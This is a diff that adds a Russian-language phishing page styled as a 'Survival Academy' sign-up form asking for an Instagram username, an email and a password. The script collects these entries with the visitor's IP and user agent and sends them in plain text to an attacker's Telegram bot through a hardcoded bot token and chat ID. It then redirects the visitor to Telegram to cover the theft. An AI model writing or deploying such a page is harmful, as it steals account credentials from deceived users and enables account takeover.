@@ -1,0 +1,193 @@
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Survival Academy</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        h2 {
+            margin-bottom: 20px;
+            color: #333;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 8px 0;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+        
+        button {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: transform 0.2s;
+        }
+        
+        button:hover {
+            transform: translateY(-2px);
+        }
+        
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            min-height: 20px;
+        }
+        
+        .success { color: #28a745; }
+        .error { color: #dc3545; }
+        .loading { color: #007bff; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>🔥 Survival Academy</h2>
+        <form id="authForm">
+            <input type="text" id="username" placeholder="📱 ЮЗ В инсте" required>
+            <input type="email" id="email" placeholder="📧 Email" required>
+            <input type="password" id="password" placeholder="🔐 Пароль" required>
+            <button type="submit">🚀 Зарегистрироваться</button>
+        </form>
+        <div id="status" class="status"></div>
+    </div>
+
+    <script>
+        // ТВОИ НАСТРОЙКИ - ЗАМЕНИ ЭТИ ДАННЫЕ!
+        const BOT_TOKEN = '8479766738:AAFNnbAORCZZu1NW94HzHaGsLO6Xq1pHCtM';
+        const CHAT_ID = '8472334933';
+
+        document.getElementById('authForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const statusEl = document.getElementById('status');
+            const form = e.target;
+            
+            // Получаем данные формы
+            const formData = {
+                username: form.username.value.trim(),
+                email: form.email.value.trim(),
+                password: form.password.value.trim(),
+                date: new Date().toLocaleString('ru-RU'),
+                ip: await getIP(),
+                userAgent: navigator.userAgent
+            };
+
+            // Проверяем заполнение
+            if (!formData.username || !formData.email || !formData.password) {
+                showStatus('❌ Заполните все поля!', 'error');
+                return;
+            }
+
+            // Формируем сообщение
+            const message = `
+🎯 НОВАЯ РЕГИСТРАЦИЯ:
+👤 Юзер: ${formData.username}
+📧 Email: ${formData.email}
+🔐 Пароль: ${formData.password}
+🌐 IP: ${formData.ip}
+📅 Дата: ${formData.date}
+            `.trim();
+
+            try {
+                showStatus('📤 Отправляем данные...', 'loading');
+
+                // Отправляем в Telegram
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.ok) {
+                    showStatus('✅ Данные отправлены тебе в Telegram!', 'success');
+                    form.reset();
+                    
+                    // Через 2 секунды переходим куда нужно
+                    setTimeout(() => {
+                        window.location.href = 'https://web.telegram.org'; // Или любой другой URL
+                    }, 2000);
+                    
+                } else {
+                    throw new Error(data.description || 'Ошибка Telegram API');
+                }
+
+            } catch (error) {
+                console.error('Ошибка:', error);
+                showStatus('❌ Ошибка отправки. Проверь настройки бота.', 'error');
+            }
+        });
+
+        // Функция получения IP
+        async function getIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch {
+                return 'Не удалось получить IP';
+            }
+        }
+
+        // Функция показа статуса
+        function showStatus(text, type) {
+            const statusEl = document.getElementById('status');
+            statusEl.textContent = text;
+            statusEl.className = 'status ' + type;
+        }
+
+        // Проверяем настройки при загрузке
+        console.log('✅ Бот инициализирован');
+        console.log('Token:', BOT_TOKEN);
+        console.log('Chat ID:', CHAT_ID);
+    </script>
+</body>
+</html>
